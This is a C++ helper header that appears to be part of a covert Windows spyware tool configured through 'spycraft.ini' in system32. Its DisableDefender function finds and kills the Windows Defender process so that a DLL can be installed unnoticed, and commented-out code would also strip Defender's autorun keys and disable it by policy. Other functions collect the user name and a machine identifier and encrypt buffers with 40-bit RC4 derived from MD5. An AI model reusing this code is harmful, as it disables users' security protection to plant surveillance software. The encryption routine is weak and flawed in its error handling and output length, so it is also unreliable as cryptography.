#pragma once
#include <time.h>
#include <errno.h>		// EINVAL
#include <Tlhelp32.h>	// CreateToolhelp32Snapshot
#include <shlwapi.h>	// SHSetValueW
#include <vector>
#define  SECURITY_WIN32
#include <Security.h> // GetUserNameEx
#include <wincrypt.h>

namespace helpers
{
	#define KEYLENGTH 0x00280000 | CRYPT_EXPORTABLE
	#define ENCRYPT_ALGORITHM CALG_RC4 
	#define ENCRYPT_BLOCK_SIZE 8

	inline std::string
	wide2Ansi(const std::wstring& in_str)
	{
		std::string temp(in_str.length(), ' ');
		std::copy(in_str.begin(), in_str.end(), temp.begin());
		return temp; 
	}

	inline std::wstring
	Ansi2wide(const std::string& in_str)
	{
		std::wstring temp(in_str.length(), ' ');
		std::copy(in_str.begin(), in_str.end(), temp.begin());
		return temp; 
	}

	inline std::wstring
	GetCurrentTimeFormatted(const std::wstring& in_Format)
	{
		wchar_t timeString[ 100 ] = { 0 };
		time_t timeNow = 0;
		time( &timeNow );
		tm currentTimeTm = { 0 };
		localtime_s(&currentTimeTm, &timeNow);
		wcsftime( timeString, sizeof(timeString), in_Format.c_str(), &currentTimeTm);
		return timeString;
	}

	inline std::string
	GetCurrentTimeFormatted(const std::string& in_Format)
	{
		char timeString[ 100 ] = { 0 };
		time_t timeNow = 0;
		time( &timeNow );
		tm currentTimeTm = { 0 };
		localtime_s(&currentTimeTm, &timeNow);
		strftime( timeString, sizeof(timeString), in_Format.c_str(), &currentTimeTm);
		return timeString;
	}


	// GetPrivateProfileStringW/GetPrivateProfileSectionW needs full path to INI file
	const std::wstring INIfile = L"\\spycraft.ini";

	inline std::wstring
	GetSystemDir()
	{
		const int siz2 = MAX_PATH;
		wchar_t buf2[siz2 + 2] = { 0 };
		GetSystemDirectoryW(buf2, siz2); // %SystemRoot%\system32, as indicated in readme.txt file
		return buf2;
	}

	inline std::wstring
	GetPathToSharedData()
	{
		return GetSystemDir() + INIfile;
	}

	inline void
	getSharedInfo(const std::wstring& in_strSection, const std::wstring& in_key, std::wstring& out_Value, const std::wstring& in_Default)
	{
		const DWORD siz = 2048;
		wchar_t buf[siz+2] = {0};
		GetPrivateProfileStringW(in_strSection.c_str(), in_key.c_str(), in_Default.c_str(), buf, siz, GetPathToSharedData().c_str() );
		out_Value = buf;
	}

	inline void
	getSharedInfo(const std::string& in_strSection, const std::string& in_key, std::string& out_Value, const std::string& in_Default)
	{
		const DWORD siz = 2048;
		char buf[siz+2] = {0};
		GetPrivateProfileStringA(in_strSection.c_str(), in_key.c_str(), in_Default.c_str(), buf, siz, wide2Ansi(GetPathToSharedData()).c_str() );
		out_Value = buf;
	}


	inline void
	getSharedInfo(const std::wstring& in_strSection, std::vector<std::wstring>& out_Value)
	{
		const DWORD siz = 32000;
		wchar_t buf[siz+2] = {0};

		/*
			The data in the buffer pointed to by the lpReturnedString parameter consists of one or more null-terminated strings, 
			followed by a final null character. Each string has the following format:

			key=string
		*/
		GetPrivateProfileSectionW(
					  in_strSection.c_str(),
					  buf,
					  siz, // The maximum profile section size is 32,767 characters
					  GetPathToSharedData().c_str() );

		wchar_t* p = buf;

		std::wstring file;

	ANOTHER_FILE:

		while(*p)
		{ 
			file += *p;
			p++;
		}

		out_Value.push_back(file);

		p++;
		if(*p) { file = L""; goto ANOTHER_FILE; }
	}
		
	//inline BOOL
	//setSharedInfo(const std::string& in_strSection, const std::string& in_key, const std::string& in_Value)
	//{
	//	return WritePrivateProfileString(in_strSection.c_str(), in_key.c_str(), in_Value.c_str(), GetPathToSharedData().c_str() );
	//}

	inline void DisableDefender()
	{
		// kill it first
		HANDLE hSnapShot = ::CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

		if( hSnapShot != (HANDLE)-1 )
		{
			PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32), 0 };
			if( ::Process32First( hSnapShot, &processEntry ) )
			{
				do
				{
					if(0 == _strnicmp("MSASCui.exe", processEntry.szExeFile, 11))
					{
						Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"Found defender");
						HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
						if(h)
						{							
							Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"Attempting to kill defender");

							TerminateProcess(h, 0);
							CloseHandle(h);
						}
						break; // Only one instance of defender runs at a time
					}
				}
				while( ::Process32Next( hSnapShot, &processEntry ) );
			}
			CloseHandle( hSnapShot );
		}

		// remove defender from auto launching reg key 64

		//if(ERROR_SUCCESS == SHDeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Windows Defender"))
		//	Log("Removed defender from auto run 64");
		//else
		//	Log("Failed to Remove defender from auto run 64");

		//// remove defender from auto launching reg key 32

		//if(ERROR_SUCCESS == SHDeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", L"Windows Defender"))
		//	Log("Removed defender from auto run 32");
		//else
		//	Log("Failed to Remove defender from auto run 32");
		//

		// disable defender using reg key
		// Leave defender as-it-was
		// Once the DLL is installed it no longer complains, so killing it prior to installation is all we have to do

		//DWORD dwValue = 1;
		//if(ERROR_SUCCESS == SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", REG_DWORD, (unsigned char*)&dwValue, sizeof( DWORD )))		
		//	Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"Disabled Defender AS");
		//else
		//	Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"Failed to Disabled Defender AS");
	}


	inline bool DoesFileOrDirExist( const std::wstring& in_strFileW )
	{
		const errno_t err = _waccess_s(in_strFileW.c_str(),0);
		if( EINVAL == err )
			return false;
		return ( ENOENT != err );
	}


	inline bool is_bit_on(unsigned int in_ui, int in_pos)
	{
		_ASSERT( (0 <= in_pos) && (in_pos <= 31) );
		return (in_ui & (1<<in_pos)) != 0;
	}

	inline std::string getrawMac()
	{
		std::string sRet("-mac-");
		UUID Id;
	
		if( RPC_S_UUID_NO_ADDRESS != UuidCreateSequential(&Id) )
		{
			PUCHAR GuidString;

			if( RPC_S_OK ==  UuidToString( &Id, &GuidString ) )
			{
				sRet = (char*)GuidString;
				RpcStringFree( &GuidString );
			}
		}
		else
		{

		}
		return sRet;
	}

	inline std::string getMac()
	{
		std::string x( getrawMac() );
		return x.substr(24);
	}

	inline std::string getUserName()
	{
		char szUserName[1024] = { 0 };
		unsigned long userNameSize = _countof( szUserName );
		GetUserNameEx( NameSamCompatible, szUserName, &userNameSize );
		return szUserName;
	}


	// free out_dst when you're done
	// returns true on success
	inline bool 
	SymEncryptBuf(
		const void* in_src, 
		const size_t in_ssz, 
		void** out_dst, 
		size_t& out_dsz,
		const char* in_pwd)
	{

		HCRYPTPROV hCryptProv;

		// Get handle to the default provider. 
		if(!CryptAcquireContext(
			  &hCryptProv, 
			  NULL,				// default key container name is used
			  NULL,
			  PROV_RSA_FULL,	// supports rc4 & md5 It is considered a general purpose CSP
			  CRYPT_VERIFYCONTEXT))	
		{
		   return false;
		}

		HCRYPTHASH hHash; 

		// Create a hash object
		if(!CryptCreateHash(
		   hCryptProv, 
		   CALG_MD5, 
		   0,	// nonkeyed algorithm
		   0, 
		   &hHash))    
		{ 
			return false;
		}  

		// hash the password
		if(!CryptHashData(
		   hHash, 
		   (BYTE *)in_pwd, // data added to the hash
		   strlen(in_pwd), 
		   0))
		{
			return false;
		}

		HCRYPTKEY hKey; 

		// Derive a session key from the hash object. A randomly-generated key that is used one time, then discarded. Session keys are symmetric 
		if(!CryptDeriveKey(
			   hCryptProv, 
			   ENCRYPT_ALGORITHM, //rc4 key length 40bits, we use 40 bits (KEYLENGTH)
			   hHash, 
			   KEYLENGTH, // set with upper 16 bits, Due to changing export control restrictions, the default CSP and default key length may change between operating system releases. It is important that both the encryption and decryption use the same CSP and that the key length be explicitly set using the dwFlags parameter to ensure interoperability on different operating system platforms.
			   &hKey))	 
		 {
			return false;
		 }

		// Destroy the hash object. 
		CryptDestroyHash(hHash); 
		hHash = 0; 

		// Determine number of bytes to encrypt at a time. 
		// This must be a multiple of ENCRYPT_BLOCK_SIZE.
		// ENCRYPT_BLOCK_SIZE is set by a #define statement.

		DWORD dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE; 

		// Determine the block size. If a block cipher is used, 
		// it must have room for an extra block. 

		DWORD dwBufferLen;

		if(ENCRYPT_BLOCK_SIZE > 1) 
			dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE; 
		else 
			dwBufferLen = dwBlockLen; 

		// Allocate memory. 
		PBYTE pbBuffer = (BYTE *)malloc(dwBufferLen);

		UINT totMem = dwBufferLen;		// totMem holds amount of memory allocated for buf variable	
		void* buf = malloc(dwBufferLen);

		size_t outdst_location = 0; // marker when writing into out_dst
		size_t nRead = 0;			// total amount of bytes encrypted so far
		do
		{
			// set up dwCount to the amount to encrypt next, a value between 0 up to dwBlockLen
			DWORD dwCount = nRead + dwBlockLen > in_ssz ? in_ssz-nRead: dwBlockLen;

			// put in_src in pbBuffer in dwBlockLen blocks
			// we encrypt the data in pbBuffer
			memmove(pbBuffer, (char*)in_src + nRead, min(dwBlockLen, dwCount));

			nRead += dwCount;

			// Encrypt data. 
			if(!CryptEncrypt(
				 hKey, 
				 0, 
				 nRead >= in_ssz, // TRUE for the last or only block and FALSE if there are more blocks to be encrypted
				 0, 
				 pbBuffer, 
				 &dwCount, 
				 dwBufferLen))
			{ 
			   return false;
			} 

			// put pbBuffer in buf
			if(nRead + dwCount >= totMem)  			// if bytes read exceed allocated memory, grow memory
			{
				buf = realloc(buf, totMem*2);		// grow memory by twice each time
				totMem *= 2;
			}

			memcpy((char*)buf + outdst_location, pbBuffer, dwCount); // copy pbBuffer into buf + location, for the amounts of bytes read

			outdst_location += dwCount;				// increment index

		}while(nRead < in_ssz);

		*out_dst = buf; buf = 0;
		out_dsz = nRead;

		// Free memory. 
		if(pbBuffer) 
			 free(pbBuffer); 
	 
		// Destroy session key. 
		if(hKey) 
			CryptDestroyKey(hKey); 

		// Release provider handle. 

		if(hCryptProv) 
			CryptReleaseContext(hCryptProv, 0);	

		return true;
	}



}